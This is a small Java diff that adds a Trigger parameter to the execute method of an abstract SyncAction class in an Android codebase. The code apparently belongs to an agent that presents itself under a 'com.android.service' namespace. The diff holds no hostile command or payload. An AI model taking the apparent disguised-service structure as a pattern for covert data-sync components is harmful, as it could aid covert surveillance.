@@ -14,6 +14,7 @@ import java.util.Vector;
 
 import org.json.JSONObject;
 
+import com.android.service.Trigger;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
@@ -73,7 +74,7 @@ public abstract class SyncAction extends SubActionSlow {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		if (Cfg.DEBUG) {
 			Check.requires(protocol != null, "execute: null protocol"); //$NON-NLS-1$
 		}
